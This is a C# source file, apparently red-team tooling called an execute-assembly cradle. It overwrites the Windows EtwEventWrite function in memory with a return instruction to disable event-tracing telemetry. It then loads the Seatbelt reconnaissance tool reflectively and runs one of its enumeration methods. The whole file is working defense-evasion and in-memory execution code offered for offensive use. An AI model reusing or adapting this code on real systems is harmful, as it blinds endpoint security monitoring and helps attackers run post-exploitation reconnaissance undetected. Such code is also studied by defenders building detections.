using System;
using System.IO;
using System.Reflection;
using System.Linq;
using System.Runtime.InteropServices;

namespace Execute_Assembly_Cradle
{
    class Win32
    {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    }
    class Program
    {
        static void Main(string[] args)
        {

            if (Environment.Is64BitOperatingSystem)
            {
                //Patch x64
                PatchEtw(new byte[] { 0xc3, 0x00, 0x00 });
            } else {
                // Patch x86
                PatchEtw(new byte[] { 0xc2, 0x14, 0x00 });
            }

            //Read the assembly from disk into a byte array
            byte[] bytes = File.ReadAllBytes(@"C:\Repos\PrebuildTools\Seatbelt\.NET 4\Seatbelt.exe");
            ExecuteAssemblyMethod(bytes, "Seatbelt.Program", "ListRecentRunCommands", null);

            Console.Write("Press any key to exit");
            Console.ReadLine();
        }

        //Load an assembly and execute a method and pass required parameters
        public static void ExecuteAssemblyMethod(byte[] assemblyBytes, string typeName, string methodName, object[] parameters)
        {
            //Load the assembly
            Assembly assembly = Assembly.Load(assemblyBytes);
            //Find the type (Namespace and class) containing the method
            Type type = assembly.GetType(typeName);
            //Create an instance of the type using a constructor
            object instance = Activator.CreateInstance(type);
            //Select the method to be called
            MethodInfo method = type.GetMethod(methodName);
            //Invoke the method from the instanciated type with the specified parameters
            object execute = method.Invoke(type, parameters);
        }


        private static void PatchEtw(byte[] patch)
        {
            try
            {
                uint oldProtect;

                var ntdll = Win32.LoadLibrary("ntdll.dll");
                var etwEventSend = Win32.GetProcAddress(ntdll, "EtwEventWrite");

                Win32.VirtualProtect(etwEventSend, (UIntPtr)patch.Length, 0x40, out oldProtect);
                Marshal.Copy(patch, 0, etwEventSend, patch.Length);
            }
            catch
            {
                Console.WriteLine("Error unhooking ETW");
            }
        }
    }
}